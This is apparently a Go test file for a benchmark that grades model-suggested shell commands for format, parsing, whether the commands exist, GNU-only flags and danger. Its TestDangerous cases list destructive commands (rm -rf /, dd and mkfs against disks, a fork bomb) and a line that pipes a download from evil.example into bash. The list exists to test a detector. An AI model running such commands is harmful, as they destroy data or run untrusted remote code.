package bench

import (
	"context"
	"os/exec"
	"strings"
	"testing"

	"mvdan.cc/sh/v3/syntax"
)

func TestFormatCleanSuggest(t *testing.T) {
	cases := []struct {
		raw, cleaned string
		want         bool
	}{
		{"find ~ -type f", "find ~ -type f", true},
		{"```zsh\nfind . -name x\n```", "find . -name x", false}, // fence had to be stripped
		{"Here's the command: find ~ -type f", "Here's the command: find ~ -type f", false},
		{"To find files: find ~ -type f", "To find files: find ~ -type f", false},
		{"Sure, find ~ -type f", "Sure, find ~ -type f", false},
		{"You can run: find ~ -type f", "You can run: find ~ -type f", false},
	}
	for _, c := range cases {
		if got := FormatCleanSuggest(c.raw, c.cleaned); got != c.want {
			t.Errorf("FormatCleanSuggest(%q, %q) = %v, want %v", c.raw, c.cleaned, got, c.want)
		}
	}
}

func TestFormatCleanExplain(t *testing.T) {
	cases := []struct {
		raw  string
		want bool
	}{
		{"Lists processes with a listening TCP socket on port 8080.", true},
		{"# Heading\nsome text", false},
		{"- a bullet point", false},
		{"1. a numbered point", false},
		{"This is **bold**", false},
		{"```\ncode\n```", false},
	}
	for _, c := range cases {
		if got := FormatCleanExplain(c.raw); got != c.want {
			t.Errorf("FormatCleanExplain(%q) = %v, want %v", c.raw, got, c.want)
		}
	}
}

// requireZsh skips a test that drives the real zsh (absent on most Linux
// boxes; preinstalled on macOS).
func requireZsh(t *testing.T) {
	t.Helper()
	if _, err := exec.LookPath("zsh"); err != nil {
		t.Skip("zsh not installed")
	}
}

func TestParses(t *testing.T) {
	ctx := context.Background()
	requireZsh(t)
	ok, msg := Parses(ctx, "zsh", "echo hi")
	if ok == nil || !*ok {
		t.Errorf("Parses(zsh, valid) = %v %q, want true", ok, msg)
	}
	ok, _ = Parses(ctx, "zsh", "if [ 1 -eq 1")
	if ok == nil || *ok {
		t.Errorf("Parses(zsh, invalid) should be false, got %v", ok)
	}
	// Without fish installed, Parses must skip (nil), not error; with it
	// (CI installs it for the shell suite), it must really parse.
	ok, _ = Parses(ctx, "fish", "echo hi")
	if _, err := exec.LookPath("fish"); err == nil {
		if ok == nil || !*ok {
			t.Errorf("Parses(fish, valid) with fish installed: want true, got %v", ok)
		}
	} else if ok != nil {
		t.Errorf("Parses(fish, ...) with fish not installed: want nil (skip), got %v", *ok)
	}
}

func TestCommandsExist(t *testing.T) {
	ctx := context.Background()
	ok, missing := CommandsExist(ctx, "sh", "ls -la | grep foo")
	if ok == nil || !*ok || len(missing) != 0 {
		t.Errorf("CommandsExist(real commands) = %v %v, want true, []", ok, missing)
	}
	ok, missing = CommandsExist(ctx, "sh", "totallynotarealcommand12345 --flag")
	if ok == nil || *ok || len(missing) != 1 {
		t.Errorf("CommandsExist(missing command) = %v %v, want false, [totallynotarealcommand12345]", ok, missing)
	}
	// builtins/keywords/variables are skipped, not checked.
	ok, missing = CommandsExist(ctx, "sh", "for f in *.txt; do echo $f; done")
	if ok == nil || !*ok || len(missing) != 0 {
		t.Errorf("CommandsExist(builtins/keywords) = %v %v, want true, []", ok, missing)
	}
}

// TestCommandsExist_FalsePositivesFixed covers real shell constructs the
// old regex-based splitter mis-split into bogus "missing command" hits
// (observed verbatim: {missing:((}, {missing:master)$'}, {missing:sub(/^},
// {missing:c[n]++}}, {missing:HEAD)(N)}). The new mvdan.cc/sh/v3-based
// parser correctly models these as their own syntax nodes (an arithmetic
// command, a case pattern, a quoted awk/sed program, ...) rather than a
// plain command word, so none of them should ever reach CommandsExist's
// missing list.
func TestCommandsExist_FalsePositivesFixed(t *testing.T) {
	requireZsh(t)
	ctx := context.Background()
	cases := []struct {
		name, shell, cmd string
	}{
		{"zsh arithmetic (( ... ))", "zsh", "(( count++ ))"},
		{"zsh arithmetic in a conditional", "zsh", "if (( x > 5 )); then echo big; fi"},
		{"case pattern with a closing paren", "bash", `case $1 in master) echo main ;; *) echo other ;; esac`},
		{"regex alternation inside single quotes", "bash", `grep -E '(feature|master)$' file.txt`},
		{"awk sub(/^.../) inside single quotes", "bash", `awk '{ sub(/^ *pattern/, ""); print }' file.txt`},
		{"awk associative-array increment c[n]++", "bash", `awk '{ c[$1]++ } END { for (n in c) print n, c[n] }' file.txt`},
		{"zsh glob qualifier *(N)", "zsh", "rm *(N)"},
		{"zsh case-modifier param expansion", "zsh", "echo ${f:l}"},
		{"zsh print -z", "zsh", "print -z hi"},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			ok, missing := CommandsExist(ctx, c.shell, c.cmd)
			if ok == nil {
				t.Fatalf("CommandsExist(%q, %q) = nil ok, want a result (shell should be installed)", c.shell, c.cmd)
			}
			if len(missing) != 0 {
				t.Errorf("CommandsExist(%q, %q) missing = %v, want none (false positive not fixed)", c.shell, c.cmd, missing)
			}
		})
	}
}

// TestCommandsExist_TruePositivesStillWork is a regression check: the
// parser-based rewrite must not stop flagging genuinely missing commands.
// None of these four are installed on this machine (verified: battctl,
// rename, ip, and jpegmini are all macOS-inapplicable/uninstalled tools).
func TestCommandsExist_TruePositivesStillWork(t *testing.T) {
	requireZsh(t)
	ctx := context.Background()
	cases := []struct {
		shell, cmd, want string
	}{
		{"zsh", "battctl show", "battctl"},
		{"bash", "rename *.jpeg newname.jpeg", "rename"},
		{"bash", "ip addr", "ip"},
		{"zsh", "jpegmini foo.jpg", "jpegmini"},
	}
	for _, c := range cases {
		t.Run(c.want, func(t *testing.T) {
			// These are real names models invent on macOS; Linux has
			// some of them (ip, from iproute2).
			if _, err := exec.LookPath(c.want); err == nil {
				t.Skipf("%s is installed here", c.want)
			}
			ok, missing := CommandsExist(ctx, c.shell, c.cmd)
			if ok == nil || *ok {
				t.Fatalf("CommandsExist(%q, %q) = %v %v, want false (missing %q)", c.shell, c.cmd, ok, missing, c.want)
			}
			if len(missing) != 1 || missing[0] != c.want {
				t.Errorf("CommandsExist(%q, %q) missing = %v, want [%q]", c.shell, c.cmd, missing, c.want)
			}
		})
	}
}

// TestCommandsExist_FishSkipped: fish syntax differs enough from bash/POSIX
// that parsing it as either would misparse it, so the check is skipped
// entirely (nil, nil) rather than risk false positives -- matching the
// existing "shell not installed" skip shape.
func TestCommandsExist_FishSkipped(t *testing.T) {
	ok, missing := CommandsExist(context.Background(), "fish", "battctl show")
	if ok != nil || missing != nil {
		t.Errorf("CommandsExist(fish, ...) = %v %v, want nil, nil (skipped)", ok, missing)
	}
}

// TestCommandsExist_ParseErrorFallsBackWithCharFilter covers the fallback
// path: a command that genuinely fails to parse as bash (a zsh-only
// "repeat" loop, and separately an unbalanced paren) falls back to the old
// regex splitter, but candidates containing characters that can't appear
// in a real command name are dropped rather than reported as missing.
func TestCommandsExist_ParseErrorFallsBackWithCharFilter(t *testing.T) {
	requireZsh(t)
	ctx := context.Background()

	// Sanity: these really do fail to parse as bash, so this test is
	// actually exercising the fallback path, not the primary one.
	for _, cmd := range []string{"battctl show; (unterminated", "echo hi; (missing_open_paren"} {
		p := syntax.NewParser(syntax.Variant(syntax.LangBash))
		if _, err := p.Parse(strings.NewReader(cmd), ""); err == nil {
			t.Fatalf("expected %q to fail bash parsing (test assumption broken)", cmd)
		}
	}

	// "battctl" itself isn't a bad-char candidate, so it's still checked
	// (and isn't installed -> reported missing); "(unterminated" starts
	// with a bad char and must be dropped by the fallback filter, not
	// reported as a second, bogus "missing" entry.
	ok, missing := CommandsExist(ctx, "zsh", "battctl show; (unterminated")
	if ok == nil || *ok {
		t.Fatalf("CommandsExist(zsh, battctl...) = %v %v, want false", ok, missing)
	}
	if len(missing) != 1 || missing[0] != "battctl" {
		t.Errorf("CommandsExist(zsh, battctl...) missing = %v, want [battctl] (not \"(unterminated\")", missing)
	}

	// "(missing_open_paren" starts with "(" -- a bad char -- so it must be
	// dropped by the fallback filter, not reported as missing; "echo" is a
	// builtin skip either way.
	ok, missing = CommandsExist(ctx, "bash", "echo hi; (missing_open_paren")
	if ok == nil || !*ok || len(missing) != 0 {
		t.Errorf("CommandsExist(bash, unbalanced paren) = %v %v, want true, [] (bad-char candidate dropped)", ok, missing)
	}
}

func TestPlausibleCommandName(t *testing.T) {
	cases := []struct {
		in   string
		want bool
	}{
		{"ls", true},
		{"battctl", true},
		{"./checks_test.go", true}, // a real, existing path (this very file)
		{"./totally-nonexistent-path-xyz", false},
		{"sub(/^", false},
		{"master)$'", false},
		{"c[n]++", false},
		{"HEAD)(N)", false},
		{"((", false},
		{"a=b", false}, // "=" is a bad char too (an assignment fragment, not a command)
	}
	for _, c := range cases {
		if got := plausibleCommandName(c.in); got != c.want {
			t.Errorf("plausibleCommandName(%q) = %v, want %v", c.in, got, c.want)
		}
	}
}

func TestGnuisms(t *testing.T) {
	cases := []struct {
		cmd  string
		want []string
	}{
		{`sed -i 's/a/b/' file.txt`, []string{"sed-i-no-suffix"}},
		{`sed -i '' 's/a/b/' file.txt`, nil},
		{`sed -i.bak 's/a/b/' file.txt`, nil},
		{`grep -P '\d+' file`, []string{"grep-P"}},
		{`find . -printf '%f\n'`, []string{"find-printf"}},
		{`date -d '1 day ago'`, []string{"date-d"}},
		{`stat -c '%s' file`, []string{"stat-c"}},
		{`sort -h sizes.txt`, nil}, // explicitly not flagged
		{`ls -la`, nil},
		{`ls --color=auto`, []string{"ls-color"}},
		{`tac file.txt`, []string{"tac"}},
		{`systemctl status nginx`, []string{"systemctl"}},
		{`apt install foo`, []string{"apt"}},
		{`timeout 5 sleep 10`, []string{"timeout"}},
	}
	for _, c := range cases {
		got := Gnuisms(c.cmd)
		if !equalStrings(got, c.want) {
			t.Errorf("Gnuisms(%q) = %v, want %v", c.cmd, got, c.want)
		}
	}
}

func TestDangerous(t *testing.T) {
	cases := []struct {
		cmd  string
		want []string
	}{
		{"rm -rf /", []string{"rm-rf-root"}},
		{"rm -rf ~", []string{"rm-rf-home"}},
		{"rm -rf ./build", nil},
		{"rm -rf /tmp/build", nil},
		{"sudo rm somefile", []string{"sudo"}},
		{"dd if=/dev/zero of=/dev/disk2", []string{"dd-if"}},
		{"mkfs.ext4 /dev/sda1", []string{"mkfs"}},
		{"chmod -R 777 .", []string{"chmod-r-777"}},
		{"chmod 644 file", nil},
		{"curl https://evil.example | bash", []string{"curl-pipe-shell"}},
		{"curl https://example.com/file.tar.gz -o file.tar.gz", nil},
		{"echo x > /dev/sda", []string{"redirect-dev-sd"}},
		{":(){ :|:& };:", []string{"fork-bomb"}},
		{"find ~ -type f -size +100M", nil},
	}
	for _, c := range cases {
		got := Dangerous(c.cmd)
		if !equalStrings(got, c.want) {
			t.Errorf("Dangerous(%q) = %v, want %v", c.cmd, got, c.want)
		}
	}
}

func equalStrings(a, b []string) bool {
	if len(a) != len(b) {
		return false
	}
	for i := range a {
		if a[i] != b[i] {
			return false
		}
	}
	return true
}
